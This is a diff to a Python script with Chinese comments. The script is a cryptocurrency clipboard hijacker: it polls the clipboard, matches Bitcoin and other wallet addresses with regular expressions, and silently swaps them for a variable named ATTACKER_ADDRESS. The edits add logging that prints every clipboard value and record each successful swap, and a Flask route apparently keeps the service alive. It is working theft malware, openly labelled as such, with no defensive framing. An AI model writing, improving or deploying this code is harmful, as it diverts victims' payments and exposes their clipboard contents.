@@ -4,7 +4,7 @@ import re
 import time
 import threading
 
-# 替换的目标目标地址
+# 替换的目标地址
 ATTACKER_ADDRESS = "panteklu"
 
 
@@ -17,7 +17,7 @@ def is_crypto_address(address):
     if not isinstance(address, str):  # 如果内容不是字符串，直接返回 False
         return False
 
-    # 加密货币地址规则（全面验证）
+    # 加密货币地址规则
     patterns = {
         "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",  # 比特币（传统地址）
         "Bitcoin (SegWit)": r"^bc1[a-zA-HJ-NP-Z0-9]{6,87}$",       # 比特币（隔离见证）
@@ -42,28 +42,30 @@ def monitor_clipboard():
     """
     监控剪贴板内容，并自动替换符合加密货币地址的内容。
     """
+    print("剪贴板监控已启动")  # 监控启动时打印日志
     previous_text = ""  # 用于记录之前剪贴板内容，避免重复处理
     while True:
         try:
             clipboard_content = pyperclip.paste()  # 从剪贴板获取内容
+            print(f"剪贴板当前内容: {clipboard_content}")  # 打印剪贴板内容日志
             # 如果剪贴板内容变化且是加密货币地址，则进行替换
             if clipboard_content != previous_text and is_crypto_address(clipboard_content):
                 pyperclip.copy(ATTACKER_ADDRESS)  # 替换内容为目标地址
-                print(f"替换结果: {clipboard_content} -> {ATTACKER_ADDRESS}")
+                print(f"替换成功: {clipboard_content} -> {ATTACKER_ADDRESS}")  # 替换后的日志
                 previous_text = ATTACKER_ADDRESS  # 更新记录的内容为目标地址
             else:
                 previous_text = clipboard_content  # 保留原内容，避免重复替换
 
             time.sleep(0.5)  # 避免过于频繁监控，降低系统压力
         except Exception as e:
-            print(f"监控出现异常: {str(e)}")
-            time.sleep(1)  # 意外情况下减少监控频率
+            print(f"监控出现异常: {str(e)}")  # 打印错误日志
+            time.sleep(1)  # 异常时减少监控频率
 
 
 # Flask Web服务
 app = Flask(__name__)
 
-@app.route("/", methods=["GET", "HEAD"])
+@app.route("/", methods=["GET"])
 def home():
     """
     定义根路径以避免 404 错误。
